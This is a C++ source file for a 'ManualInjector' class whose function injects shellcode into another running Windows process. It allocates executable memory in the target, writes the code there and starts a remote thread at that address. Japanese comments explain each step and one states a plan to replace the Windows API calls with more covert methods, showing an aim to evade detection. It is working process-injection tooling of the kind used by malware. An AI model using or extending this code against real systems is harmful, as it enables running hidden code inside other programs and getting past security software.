#include "Injector.h"
#include <iostream>

bool ManualInjector::InjectAndExecute(Process& proc, const std::vector<unsigned char>& shellCode) {
	if (!proc.IsAttached() || !proc.IsAlive() || shellCode.empty()) return false;


	//後にこれはWindowsAPIの代わりに秘匿性の高い処理に変える
	

	//STEP 1: ターゲットプロセス内に「空き地」を確保
	// PAGE_EXECUTE_READWRITE を指定することで、書いたコードを実行可能にする
	void* remoteMem = VirtualAllocEx(
		proc.hProcess,
		nullptr,
		shellCode.size(),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (!remoteMem) {
		ReportError("VirtualAllocEx failed");
		return false;
	}

	//STEP 2: 確保した場所にバイナリ（機械語）を書き込む
	SIZE_T bytesWritten = 0;
	if (!WriteProcessMemory(
		proc.hProcess,
		remoteMem,
		shellCode.data(),
		shellCode.size(),
		&bytesWritten
	)) {
		ReportError("WriteProcessMem failed");
		VirtualFreeEx(proc.hProcess, remoteMem, 0, MEM_RELEASE);
		return false;
	}
	//STEP 3: 遠隔でスレッドを作成し、実行スイッチを入れる ---
	// ターゲットプロセスの CPU に対し「remoteMem の住所から処理を始めて！」と命令する


	HANDLE hThread = CreateRemoteThread(
		proc.hProcess,
		nullptr,
		0,
		(LPTHREAD_START_ROUTINE)remoteMem,
		nullptr,
		0,
		nullptr
	);

	if (!hThread) {
		ReportError("CreateRemoteThread failed");
		VirtualFreeEx(proc.hProcess, remoteMem, 0, MEM_RELEASE);
		return false;
	}

	CloseHandle(hThread);


	return true;
}

void ManualInjector::ReportError(const char* msg)
{
	std::cerr << "[Injector Error] " << msg << " | Code: " << GetLastError() << "\n";
}
